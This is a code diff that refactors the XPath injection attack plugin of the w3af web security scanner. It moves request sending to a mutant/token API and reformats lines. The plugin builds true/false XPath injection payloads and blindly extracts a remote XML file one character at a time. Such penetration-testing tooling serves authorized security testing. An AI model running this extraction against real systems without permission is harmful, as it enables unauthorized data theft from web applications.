@@ -32,7 +32,7 @@ from w3af.core.controllers.threads.threadpool import return_args
 from w3af.core.controllers.exceptions import BaseFrameworkException
 from w3af.core.data.kb.shell import Shell
 
-ERROR_MSG = 'Empty Path Expression'
+ERROR_MSG = 'Empty search result'
 XML_FILTER = '//*'
 THRESHOLD = 0.8
 
@@ -81,7 +81,7 @@ class xpath(AttackPlugin):
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
         """
-        return ['xpath',]
+        return ['xpath']
 
     def _generate_shell(self, vuln):
         """
@@ -119,28 +119,29 @@ class xpath(AttackPlugin):
         delimiter = self._get_delimiter(vuln, is_error_resp)
         self.STR_DELIM = delimiter
         
-        orig_value = vuln.get_mutant().get_original_value()
+        orig_value = vuln.get_mutant().get_token_original_value()
 
-        self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM, self.STR_DELIM,
-                                                   self.rnum, self.STR_DELIM,
+        self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM,
+                                                   self.STR_DELIM, self.rnum,
+                                                   self.STR_DELIM,
                                                    self.STR_DELIM, self.rnum)
 
-        self.FALSE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM, self.STR_DELIM,
-                                                    self.rnum, self.STR_DELIM,
+        self.FALSE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM,
+                                                    self.STR_DELIM, self.rnum,
+                                                    self.STR_DELIM,
                                                     self.STR_DELIM, self.rnum + 1)
 
-        exploit_dc = vuln.get_dc()
-        function_ptr = getattr(self._uri_opener, vuln.get_method())
+        mutant = vuln.get_mutant()
+
+        mutant_false = mutant.copy()
+        mutant_false.set_token_value(self.FALSE_COND)
         
-        exploit_dc_false = exploit_dc.copy()
-        exploit_dc_false[vuln.get_var()] = self.FALSE_COND
-        
-        exploit_dc_true = exploit_dc.copy()
-        exploit_dc_true[vuln.get_var()] = self.TRUE_COND
+        mutant_true = mutant.copy()
+        mutant_true.set_token_value(self.TRUE_COND)
 
         try:
-            false_resp = function_ptr(vuln.get_url(), str(exploit_dc_false))
-            true_resp = function_ptr(vuln.get_url(), str(exploit_dc_true))
+            false_resp = self._uri_opener.send_mutant(mutant_false)
+            true_resp = self._uri_opener.send_mutant(mutant_true)
         except BaseFrameworkException, e:
             return 'Error "%s".' % e
         else:
@@ -155,9 +156,8 @@ class xpath(AttackPlugin):
         :return: The delimiter to be used to terminate strings, one of
         single quote or double quote. If an error is found, None is returned.
         """
-        exploit_dc = vuln.get_dc()
-        orig_value = vuln.get_mutant().get_original_value()
-        function_ptr = getattr(self._uri_opener, vuln.get_method())
+        mutant = vuln.get_mutant()
+        orig_value = mutant.get_token_original_value()
 
         true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
         false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1)
@@ -168,17 +168,17 @@ class xpath(AttackPlugin):
                    ('"', true_dq, false_dq)]
         
         for str_delim, true_xpath, false_xpath in to_test:
-            exploit_dc_true = exploit_dc.copy()
-            exploit_dc_false = exploit_dc.copy()
+            mutant_true = mutant.copy()
+            mutant_false = mutant.copy()
             
-            exploit_dc_true[vuln.get_var()] = true_xpath
-            exploit_dc_false[vuln.get_var()] = false_xpath
+            mutant_true.set_token_value(true_xpath)
+            mutant_false.set_token_value(false_xpath)
             
             try:
-                true_resp = function_ptr(vuln.get_url(), str(exploit_dc_true))
-                false_resp = function_ptr(vuln.get_url(), str(exploit_dc_false))
+                true_resp = self._uri_opener.send_mutant(mutant_true)
+                false_resp = self._uri_opener.send_mutant(mutant_false)
             except BaseFrameworkException, e:
-                om.out.debug('Error "%s"' % (e))
+                om.out.debug('Error "%s"' % e)
             else:
                 if is_error_resp(false_resp.get_body()) and\
                 not is_error_resp(true_resp.get_body()):
@@ -198,23 +198,22 @@ class xpath(AttackPlugin):
         """
         diff_ratio = 0.0
 
-        exploit_dc = vuln.get_dc()
-        function_ptr = getattr(self._uri_opener, vuln.get_method())
-        exploit_dc[vuln.get_var()] = vuln.get_mutant().get_original_value()
+        mutant = vuln.get_mutant()
+        mutant.set_token_value(vuln.get_mutant().get_token_original_value())
 
         om.out.debug("Testing if body dynamically changes.")
         try:
-            base_res = function_ptr(vuln.get_url(), str(exploit_dc))
+            base_res = self._uri_opener.send_mutant(mutant)
 
             for _ in xrange(count):
-                req_x = function_ptr(vuln.get_url(), str(exploit_dc))
+                req_x = self._uri_opener.send_mutant(mutant)
                 diff_ratio += difflib.SequenceMatcher(None, base_res.get_body(),
-                                                     req_x.get_body()).ratio()
+                                                      req_x.get_body()).ratio()
 
         except BaseFrameworkException, e:
             om.out.debug('Error "%s"' % e)
         else:
-            use_difflib = (diff_ratio / count) < THRESHOLD
+            #use_difflib = (diff_ratio / count) < THRESHOLD
             # FIXME: I'm not using difflib since it doesn't work well in my
             #        test environment, but in the future I might need it for
             #        a real engagement.
@@ -231,7 +230,8 @@ class xpath(AttackPlugin):
         This plugin exploits XPATH injections. The exploit result is the full
         text dump (without tags) of the remote XML file.
 
-        No options are available at this moment since the plugin is in beta phase.
+        No options are available at this moment since the plugin is in beta
+        phase.
         """
 
 
@@ -272,10 +272,11 @@ class XPathReader(Shell):
 
     def specific_user_input(self, command, parameters):
         """
-        This method is called when a user writes a command in the shell and hits enter.
+        This method is called when a user writes a command in the shell and hits
+        enter.
 
-        Before calling this method, the framework calls the generic_user_input method
-        from the shell class.
+        Before calling this method, the framework calls the generic_user_input
+        method from the shell class.
 
         :param command: The command to handle ( ie. "read", "exec", etc ).
         :param parameters: The parameters for @command.
@@ -296,14 +297,14 @@ class XPathReader(Shell):
             data_len = self._get_data_len()
         except BaseFrameworkException, e:
             return 'Error found during data length extraction: "%s"' % e
-        else:
-            if data_len is not None:
-                try:
-                    data = self.get_data(data_len)
-                except BaseFrameworkException, e:
-                    return 'Error found during data extraction: "%s"' % e
-                else:
-                    return data
+
+        if data_len is not None:
+            try:
+                data = self.get_data(data_len)
+            except BaseFrameworkException, e:
+                return 'Error found during data extraction: "%s"' % e
+            else:
+                return data
 
     def _get_data_len(self):
         """
@@ -342,16 +343,16 @@ class XPathReader(Shell):
         Generate the XPATH, send it to the remote server and
         :return: True when the response does NOT contain an XPATH error.
         """
-        exploit_dc = self.get_dc()
-        function_ptr = getattr(self._uri_opener, self.get_method())
-        orig_value = self.get_mutant().get_original_value()
+        mutant = self.get_mutant()
+        orig_value = mutant.get_token_original_value()
         skip_len = len(orig_value) + len(self.STR_DELIM) + len(' ')
         
         findlen = xpath_fmt % (orig_value, self.STR_DELIM, XML_FILTER,
                                str_len, self.TRUE_COND[skip_len:])
         
-        exploit_dc[self.get_var()] = findlen
-        lresp = function_ptr(self.get_url(), str(exploit_dc))
+        mutant.set_token_value(findlen)
+        lresp = self._uri_opener.send_mutant(mutant)
+
         if not self.is_error_resp(lresp.get_body()): 
             return True
         
@@ -406,12 +407,11 @@ class XPathReader(Shell):
         """
         :return: The character for position @pos in the XML.
         """
-        exploit_dc = self.get_dc()
-        function_ptr = getattr(self._uri_opener, self.get_method())
-        
+        mutant = self.get_mutant()
+
         for c in range(32, 127):
 
-            orig_value = self.get_mutant().get_original_value()
+            orig_value = mutant.get_token_original_value()
             skip_len = len(orig_value) + len(self.STR_DELIM) + len(' ')
 
             hexcar = chr(c)
@@ -420,8 +420,8 @@ class XPathReader(Shell):
                                                              XML_FILTER,
                                                              pos, hexcar,
                                                              self.TRUE_COND[skip_len:])
-            exploit_dc[self.get_var()] = dataq
-            dresp = function_ptr(self.get_url(), str(exploit_dc))
+            mutant.set_token_value(dataq)
+            dresp = self._uri_opener.send_mutant(mutant)
 
             if not self.is_error_resp(dresp.get_body()):
                 om.out.console('Character found: "%s"' % hexcar)
@@ -448,12 +448,10 @@ class IsErrorResponse(object):
         self.base_response = None
 
     def _configure(self):
-        exploit_dc = self.vuln_obj.get_dc()
-        function_ptr = getattr(self.url_opener, self.vuln_obj.get_method())
+        mutant = self.vuln_obj.get_mutant()
+        mutant.set_token_value(mutant.get_token_original_value())
 
-        exploit_dc[self.vuln_obj.get_var()] = self.vuln_obj.get_mutant().get_original_value()
-        
-        self.base_response = function_ptr(self.vuln_obj.get_url(), str(exploit_dc))
+        self.base_response = self.url_opener.send_mutant(mutant)
         
     def is_error_response(self, res_body):
         """
